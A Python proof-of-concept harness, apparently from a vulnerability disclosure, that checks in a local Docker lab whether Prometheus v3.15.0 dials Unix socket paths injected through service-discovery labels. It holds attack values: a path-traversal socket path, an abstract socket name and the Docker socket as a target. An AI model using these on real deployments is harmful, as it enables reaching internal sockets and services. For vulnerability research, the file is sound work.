#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: prometheus-unix-socket-dial (High: 8.6)
#  Vendor: Prometheus (CNCF)
#  Versions: Prometheus v3.15.0 http_sd/file_sd __unix_socket__
#  Impact: http_sd __unix_socket__ unsanitized unix Dial leftover of UDS scrape
#  Requires: SD writer of __unix_socket__; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "prometheus-unix-socket-dial"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove Prometheus v3.15.0 scrapes an SD-injected __unix_socket__ path."""


import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

LABEL = "prometheus-unix-socket-dial"
WITNESS = "PROMETHEUS-UNIX-SOCKET-DIAL-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
PROM_URL = os.environ.get("PROM_URL", "http://127.0.0.1:19390").rstrip("/")
HERE = Path(__file__).resolve().parent
TRAVERSAL_PATH = "/sockets/jail/../oracle.sock"
ABSTRACT_LABEL = "@prom-lab-oracle"
SLASH_ADDRESS = "unix:///var/run/docker.sock"
READY_TIMEOUT_S = 90
SCRAPE_TIMEOUT_S = 60


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def http_get(url: str, timeout: int = 8) -> tuple[int, str]:
    req = urllib.request.Request(url, headers={"Accept": "application/json"}, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return int(resp.status), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        return 0, str(exc.reason)
    except TimeoutError:
        return 0, "timeout"


def wait_ready() -> bool:
    deadline = time.time() + READY_TIMEOUT_S
    last = "none"
    while time.time() < deadline:
        status, body = http_get(f"{PROM_URL}/-/ready", timeout=3)
        last = f"http={status} body={body.strip()[:80]}"
        if status == 200:
            log(f"prometheus-ready {last}")
            return True
        log(f"prometheus-wait {last}")
        time.sleep(2)
    log(f"prometheus-not-ready {last}")
    return False


def parse_json(body: str) -> dict[str, Any]:
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return {}
    return data if isinstance(data, dict) else {}


def label_map(raw: Any) -> dict[str, str]:
    if isinstance(raw, dict):
        return {str(key): str(value) for key, value in raw.items()}
    if isinstance(raw, list):
        out: dict[str, str] = {}
        for item in raw:
            if isinstance(item, dict) and "name" in item:
                out[str(item["name"])] = str(item.get("value", ""))
        return out
    return {}


def targets_payload() -> dict[str, Any]:
    status, body = http_get(f"{PROM_URL}/api/v1/targets")
    data = parse_json(body)
    if status != 200 or data.get("status") != "success":
        return {}
    inner = data.get("data")
    return inner if isinstance(inner, dict) else {}


def active_targets() -> list[dict[str, Any]]:
    data = targets_payload()
    rows = data.get("activeTargets")
    return rows if isinstance(rows, list) else []


def find_target(kind: str) -> dict[str, Any] | None:
    for row in active_targets():
        if not isinstance(row, dict):
            continue
        labels = label_map(row.get("discoveredLabels"))
        labels.update(label_map(row.get("labels")))
        if labels.get("kind") == kind:
            return row
    return None


def unix_socket_of(row: dict[str, Any]) -> str:
    labels = label_map(row.get("discoveredLabels"))
    labels.update(label_map(row.get("labels")))
    return labels.get("__unix_socket__", "")


def slash_active() -> bool:
    for row in active_targets():
        if not isinstance(row, dict):
            continue
        labels = label_map(row.get("discoveredLabels"))
        labels.update(label_map(row.get("labels")))
        if labels.get("__address__") == SLASH_ADDRESS:
            return True
        if SLASH_ADDRESS in str(row.get("scrapeUrl", "")):
            return True
    return False


def query_witness_kinds() -> set[str]:
    encoded = urllib.parse.urlencode({"query": "lab_witness"})
    status, body = http_get(f"{PROM_URL}/api/v1/query?{encoded}")
    data = parse_json(body)
    if status != 200 or data.get("status") != "success":
        return set()
    inner = data.get("data")
    if not isinstance(inner, dict):
        return set()
    result = inner.get("result")
    if not isinstance(result, list):
        return set()
    kinds: set[str] = set()
    for row in result:
        if not isinstance(row, dict):
            continue
        metric = row.get("metric")
        if not isinstance(metric, dict):
            continue
        if str(metric.get("witness", "")) != WITNESS:
            continue
        value = row.get("value")
        sample = value[1] if isinstance(value, list) and len(value) > 1 else ""
        if str(sample) == "1":
            kinds.add(str(metric.get("kind", "")))
    return kinds


def sync_failed_total() -> float:
    status, body = http_get(f"{PROM_URL}/metrics")
    if status != 200:
        return -1.0
    total = 0.0
    found = False
    pattern = re.compile(
        r'^prometheus_target_sync_failed_total\{[^}]*scrape_job="uds-from-http-sd"[^}]*\}\s+([0-9.eE+-]+)'
    )
    for line in body.splitlines():
        match = pattern.match(line)
        if match:
            found = True
            total += float(match.group(1))
    return total if found else 0.0


def hostname_reject_logged() -> bool:
    proc = compose("logs", "--no-color", "prometheus", timeout=30)
    blob = f"{proc.stdout}\n{proc.stderr}"
    return 'is not a valid hostname' in blob and SLASH_ADDRESS in blob


def sidecar_hits() -> list[dict[str, str]]:
    proc = compose("exec", "-T", "sidecar", "cat", "/hits/hits.jsonl", timeout=20)
    if proc.returncode != 0:
        log(f"hits-exec-failed rc={proc.returncode} err={proc.stderr.strip()[:200]}")
        return []
    rows: list[dict[str, str]] = []
    for line in proc.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            item = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(item, dict):
            rows.append({str(k): str(v) for k, v in item.items()})
    return rows


def hit_for(kind: str, path: str, rows: list[dict[str, str]]) -> bool:
    for row in rows:
        if row.get("kind") == kind and row.get("path", "").startswith(path) and row.get("witness") == WITNESS:
            return True
    return False


def ua_prometheus(rows: list[dict[str, str]]) -> bool:
    return any("Prometheus/" in row.get("user_agent", "") for row in rows)


def main() -> int:
    if not wait_ready():
        return fail("prometheus-not-ready")

    deadline = time.time() + SCRAPE_TIMEOUT_S
    fs_row: dict[str, Any] | None = None
    abs_row: dict[str, Any] | None = None
    kinds: set[str] = set()
    hits: list[dict[str, str]] = []
    failed_total = -1.0
    while time.time() < deadline:
        fs_row = find_target("fs-traversal")
        abs_row = find_target("abstract")
        kinds = query_witness_kinds()
        hits = sidecar_hits()
        failed_total = sync_failed_total()
        log(
            "wait "
            f"fs-health={fs_row.get('health') if fs_row else 'missing'} "
            f"abs-health={abs_row.get('health') if abs_row else 'missing'} "
            f"kinds={sorted(kinds)} "
            f"hits={len(hits)} "
            f"sync-failed={failed_total}"
        )
        if (
            fs_row
            and abs_row
            and fs_row.get("health") == "up"
            and abs_row.get("health") == "up"
            and "fs-traversal" in kinds
            and "abstract" in kinds
            and hit_for("fs-traversal", "/fs-traversal", hits)
            and hit_for("abstract", "/abstract", hits)
            and failed_total > 0
            and not slash_active()
        ):
            break
        time.sleep(2)
    else:
        return fail(
            "scrape-timeout "
            f"fs={bool(fs_row)} abs={bool(abs_row)} kinds={sorted(kinds)} "
            f"hits={len(hits)} sync-failed={failed_total} slash-active={slash_active()}"
        )

    fs_sock = unix_socket_of(fs_row or {})
    abs_sock = unix_socket_of(abs_row or {})
    if fs_sock != TRAVERSAL_PATH:
        return fail(f"fs-socket-mismatch got={fs_sock}")
    if abs_sock != ABSTRACT_LABEL:
        return fail(f"abstract-socket-mismatch got={abs_sock}")
    if slash_active():
        return fail("tcp-slash-still-active")
    if not hostname_reject_logged():
        return fail("tcp-slash-log-missing")
    if not ua_prometheus(hits):
        return fail("scrape-user-agent-missing")

    fs_url = str((fs_row or {}).get("scrapeUrl", ""))
    abs_url = str((abs_row or {}).get("scrapeUrl", ""))
    log(f"IOC fs-socket={fs_sock} scrapeUrl={fs_url} health=up")
    log(f"IOC abstract-socket={abs_sock} scrapeUrl={abs_url} health=up")
    log(f"IOC tcp-slash-rejected=yes sync-failed={failed_total} address={SLASH_ADDRESS}")
    log("IOC sd=http_sd labels=__unix_socket__")
    log(
        f"SUCCESS {LABEL} sd=http_sd fs-traversal=yes abstract=yes "
        f"tcp-slash-rejected=yes how=sd-labels {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

